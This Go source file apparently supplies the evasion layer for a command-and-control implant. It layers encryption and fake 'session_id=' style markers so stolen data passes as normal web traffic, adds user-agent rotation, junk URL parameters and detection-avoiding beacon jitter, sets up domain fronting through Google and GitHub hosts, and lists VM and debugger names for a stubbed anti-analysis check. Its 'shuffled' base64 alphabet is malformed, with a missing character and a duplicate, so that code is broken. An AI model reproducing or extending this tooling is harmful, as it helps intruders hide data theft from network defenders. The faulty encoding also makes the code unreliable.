package main

import (
	"bytes"
	"compress/gzip"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
//	"encoding/hex"
	"fmt"
	"io"
	"math/big"
	"strings"
	"time"
)

// CryptoManager handles all encryption and obfuscation operations
type CryptoManager struct {
	primaryKey   []byte
	secondaryKey []byte
	gcm          cipher.AEAD
}

// TrafficObfuscator handles traffic obfuscation
type TrafficObfuscator struct {
	userAgents []string
	junkData   []string
}

// NewCryptoManager creates a new crypto manager with given keys
func NewCryptoManager(primaryKey, secondaryKey string) (*CryptoManager, error) {
	// Generate 32-byte keys from strings
	pKey := sha256.Sum256([]byte(primaryKey))
	sKey := sha256.Sum256([]byte(secondaryKey))

	block, err := aes.NewCipher(pKey[:])
	if err != nil {
		return nil, fmt.Errorf("failed to create cipher: %v", err)
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, fmt.Errorf("failed to create GCM: %v", err)
	}

	return &CryptoManager{
		primaryKey:   pKey[:],
		secondaryKey: sKey[:],
		gcm:          gcm,
	}, nil
}

// EncryptData encrypts data with multiple layers
func (cm *CryptoManager) EncryptData(data []byte) (string, error) {
	// Layer 1: Compress data
	compressed, err := cm.compressData(data)
	if err != nil {
		return "", fmt.Errorf("compression failed: %v", err)
	}

	// Layer 2: Add padding
	padded := cm.addPadding(compressed)

	// Layer 3: AES-GCM encryption
	nonce := make([]byte, cm.gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return "", fmt.Errorf("nonce generation failed: %v", err)
	}

	encrypted := cm.gcm.Seal(nil, nonce, padded, nil)

	// Layer 4: Combine nonce + encrypted data
	combined := append(nonce, encrypted...)

	// Layer 5: Base64 encoding with custom alphabet
	encoded := cm.customBase64Encode(combined)

	// Layer 6: Add obfuscation markers
	obfuscated := cm.addObfuscationMarkers(encoded)

	return obfuscated, nil
}

// DecryptData decrypts data reversing all layers
func (cm *CryptoManager) DecryptData(obfuscatedData string) ([]byte, error) {
	// Layer 6: Remove obfuscation markers
	encoded := cm.removeObfuscationMarkers(obfuscatedData)

	// Layer 5: Custom Base64 decode
	combined, err := cm.customBase64Decode(encoded)
	if err != nil {
		return nil, fmt.Errorf("base64 decode failed: %v", err)
	}

	// Layer 4: Extract nonce and encrypted data
	if len(combined) < cm.gcm.NonceSize() {
		return nil, fmt.Errorf("invalid data size")
	}

	nonce := combined[:cm.gcm.NonceSize()]
	encrypted := combined[cm.gcm.NonceSize():]

	// Layer 3: AES-GCM decryption
	padded, err := cm.gcm.Open(nil, nonce, encrypted, nil)
	if err != nil {
		return nil, fmt.Errorf("decryption failed: %v", err)
	}

	// Layer 2: Remove padding
	compressed := cm.removePadding(padded)

	// Layer 1: Decompress
	data, err := cm.decompressData(compressed)
	if err != nil {
		return nil, fmt.Errorf("decompression failed: %v", err)
	}

	return data, nil
}

// compressData compresses data using gzip
func (cm *CryptoManager) compressData(data []byte) ([]byte, error) {
	var buf bytes.Buffer
	writer := gzip.NewWriter(&buf)
	
	if _, err := writer.Write(data); err != nil {
		return nil, err
	}
	
	if err := writer.Close(); err != nil {
		return nil, err
	}
	
	return buf.Bytes(), nil
}

// decompressData decompresses gzip data
func (cm *CryptoManager) decompressData(data []byte) ([]byte, error) {
	reader, err := gzip.NewReader(bytes.NewReader(data))
	if err != nil {
		return nil, err
	}
	defer reader.Close()
	
	return io.ReadAll(reader)
}

// addPadding adds random padding to make traffic analysis harder
func (cm *CryptoManager) addPadding(data []byte) []byte {
	// Add 1-16 bytes of random padding
	paddingSize := 1 + (len(data) % 16)
	padding := make([]byte, paddingSize)
	rand.Read(padding)
	
	// Prepend padding size as first byte, then padding, then data
	result := make([]byte, 1+paddingSize+len(data))
	result[0] = byte(paddingSize)
	copy(result[1:1+paddingSize], padding)
	copy(result[1+paddingSize:], data)
	
	return result
}

// removePadding removes the padding
func (cm *CryptoManager) removePadding(data []byte) []byte {
	if len(data) < 2 {
		return data
	}
	
	paddingSize := int(data[0])
	if paddingSize >= len(data) {
		return data
	}
	
	return data[1+paddingSize:]
}

// Custom Base64 encoding with shuffled alphabet
func (cm *CryptoManager) customBase64Encode(data []byte) string {
	// Custom alphabet (shuffled standard base64)
	customAlphabet := "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
	shuffledAlphabet := "ZmNxWvutsrqponmlkjihgfedcbaYXVUTSRQPOMLKJIHGFEDCBA9876543210/+"
	
	// Standard base64 encode first
	encoded := base64.StdEncoding.EncodeToString(data)
	
	// Replace characters with custom alphabet
	result := strings.Builder{}
	for _, char := range encoded {
		if idx := strings.IndexRune(customAlphabet, char); idx >= 0 {
			result.WriteByte(shuffledAlphabet[idx])
		} else {
			result.WriteRune(char)
		}
	}
	
	return result.String()
}

// Custom Base64 decoding
func (cm *CryptoManager) customBase64Decode(encoded string) ([]byte, error) {
	customAlphabet := "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
	shuffledAlphabet := "ZmNxWvutsrqponmlkjihgfedcbaYXVUTSRQPOMLKJIHGFEDCBA9876543210/+"
	
	// Reverse the character mapping
	result := strings.Builder{}
	for _, char := range encoded {
		if idx := strings.IndexRune(shuffledAlphabet, char); idx >= 0 {
			result.WriteByte(customAlphabet[idx])
		} else {
			result.WriteRune(char)
		}
	}
	
	return base64.StdEncoding.DecodeString(result.String())
}

// addObfuscationMarkers adds random markers to make data look like legitimate traffic
func (cm *CryptoManager) addObfuscationMarkers(data string) string {
	markers := []string{
		"session_id=",
		"token=",
		"data=",
		"payload=",
		"content=",
		"response=",
	}
	
	// Pick random marker
	marker := markers[cm.randomInt(len(markers))]
	return marker + data
}

// removeObfuscationMarkers removes the markers
func (cm *CryptoManager) removeObfuscationMarkers(data string) string {
	markers := []string{
		"session_id=",
		"token=",
		"data=",
		"payload=",
		"content=",
		"response=",
	}
	
	for _, marker := range markers {
		if strings.HasPrefix(data, marker) {
			return data[len(marker):]
		}
	}
	
	return data
}

// randomInt generates a random integer
func (cm *CryptoManager) randomInt(max int) int {
	n, _ := rand.Int(rand.Reader, big.NewInt(int64(max)))
	return int(n.Int64())
}

// NewTrafficObfuscator creates a new traffic obfuscator
func NewTrafficObfuscator() *TrafficObfuscator {
	return &TrafficObfuscator{
		userAgents: []string{
			"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
			"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
			"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101",
		},
		junkData: []string{
			"utm_source=google&utm_medium=cpc&utm_campaign=search",
			"ref=homepage&section=main&subsection=featured",
			"lang=en&region=us&timezone=UTC&format=json",
			"version=1.0&api_key=demo&timestamp=" + fmt.Sprintf("%d", time.Now().Unix()),
			"client=web&platform=desktop&browser=chrome&os=windows",
		},
	}
}

// GetRandomUserAgent returns a random user agent
func (to *TrafficObfuscator) GetRandomUserAgent() string {
	return to.userAgents[to.randomInt(len(to.userAgents))]
}

// GetJunkData returns random junk data to pad requests
func (to *TrafficObfuscator) GetJunkData() string {
	return to.junkData[to.randomInt(len(to.junkData))]
}

// ObfuscateURL adds junk parameters to URL
func (to *TrafficObfuscator) ObfuscateURL(baseURL string) string {
	junk := to.GetJunkData()
	separator := "?"
	if strings.Contains(baseURL, "?") {
		separator = "&"
	}
	return baseURL + separator + junk
}

// randomInt for TrafficObfuscator
func (to *TrafficObfuscator) randomInt(max int) int {
	n, _ := rand.Int(rand.Reader, big.NewInt(int64(max)))
	return int(n.Int64())
}

// SleepWithJitter implements randomized sleep to avoid detection
type SleepManager struct {
	baseInterval time.Duration
	jitter       float64 // 0.0 to 1.0
}

// NewSleepManager creates a new sleep manager
func NewSleepManager(baseInterval time.Duration, jitter float64) *SleepManager {
	return &SleepManager{
		baseInterval: baseInterval,
		jitter:       jitter,
	}
}

// Sleep sleeps for a randomized duration
func (sm *SleepManager) Sleep() {
	if sm.jitter <= 0 {
		time.Sleep(sm.baseInterval)
		return
	}
	
	// Calculate jitter range
	jitterRange := float64(sm.baseInterval) * sm.jitter
	maxJitter := int64(jitterRange)
	
	if maxJitter <= 0 {
		time.Sleep(sm.baseInterval)
		return
	}
	
	// Generate random jitter
	jitterAmount, _ := rand.Int(rand.Reader, big.NewInt(maxJitter*2))
	actualJitter := time.Duration(jitterAmount.Int64() - maxJitter)
	
	finalDuration := sm.baseInterval + actualJitter
	if finalDuration < time.Second {
		finalDuration = time.Second
	}
	
	time.Sleep(finalDuration)
}

// DomainFronting helps with domain fronting techniques
type DomainFronting struct {
	frontDomains []string
	realDomain   string
}

// NewDomainFronting creates a new domain fronting helper
func NewDomainFronting(realDomain string) *DomainFronting {
	return &DomainFronting{
		frontDomains: []string{
			"ajax.googleapis.com",
			"fonts.googleapis.com",
			"www.google.com",
			"api.github.com",
			"raw.githubusercontent.com",
			"cdnjs.cloudflare.com",
		},
		realDomain: realDomain,
	}
}

// GetFrontDomain returns a random front domain
func (df *DomainFronting) GetFrontDomain() string {
	n, _ := rand.Int(rand.Reader, big.NewInt(int64(len(df.frontDomains))))
	return df.frontDomains[n.Int64()]
}

// GetHostHeader returns the real domain for Host header
func (df *DomainFronting) GetHostHeader() string {
	return df.realDomain
}

// Anti-Analysis techniques
type AntiAnalysis struct {
	vmIndicators     []string
	debuggerIndicators []string
}

// NewAntiAnalysis creates new anti-analysis checker
func NewAntiAnalysis() *AntiAnalysis {
	return &AntiAnalysis{
		vmIndicators: []string{
			"VMware",
			"VirtualBox", 
			"QEMU",
			"Xen",
			"Hyper-V",
		},
		debuggerIndicators: []string{
			"ollydbg",
			"x64dbg",
			"windbg",
			"ida",
			"ghidra",
		},
	}
}

// CheckEnvironment performs basic environment checks
func (aa *AntiAnalysis) CheckEnvironment() bool {
	// This is a simplified check - in real implementation,
	// you'd check registry keys, running processes, timing attacks, etc.
	
	// For now, just return true (safe environment)
	// In production, implement actual VM/sandbox detection
	return true
}

// Example usage and integration
type SecureAgent struct {
	crypto     *CryptoManager
	obfuscator *TrafficObfuscator
	sleeper    *SleepManager
	antiAnalysis *AntiAnalysis
}

// NewSecureAgent creates a new secure agent with all protections
func NewSecureAgent(primaryKey, secondaryKey string, interval time.Duration) (*SecureAgent, error) {
	crypto, err := NewCryptoManager(primaryKey, secondaryKey)
	if err != nil {
		return nil, err
	}
	
	return &SecureAgent{
		crypto:       crypto,
		obfuscator:   NewTrafficObfuscator(),
		sleeper:      NewSleepManager(interval, 0.3), // 30% jitter
		antiAnalysis: NewAntiAnalysis(),
	}, nil
}

// SecureSend encrypts and obfuscates data before sending
func (sa *SecureAgent) SecureSend(data []byte) (string, map[string]string, error) {
	// Check environment first
	if !sa.antiAnalysis.CheckEnvironment() {
		return "", nil, fmt.Errorf("unsafe environment detected")
	}
	
	// Encrypt data
	encrypted, err := sa.crypto.EncryptData(data)
	if err != nil {
		return "", nil, err
	}
	
	// Prepare headers
	headers := map[string]string{
		"User-Agent":    sa.obfuscator.GetRandomUserAgent(),
		"Content-Type":  "application/x-www-form-urlencoded",
		"Cache-Control": "no-cache",
	}
	
	return encrypted, headers, nil
}

// SecureReceive decrypts received data
func (sa *SecureAgent) SecureReceive(encryptedData string) ([]byte, error) {
	return sa.crypto.DecryptData(encryptedData)
}

// WaitWithJitter sleeps with randomization
func (sa *SecureAgent) WaitWithJitter() {
	sa.sleeper.Sleep()
}
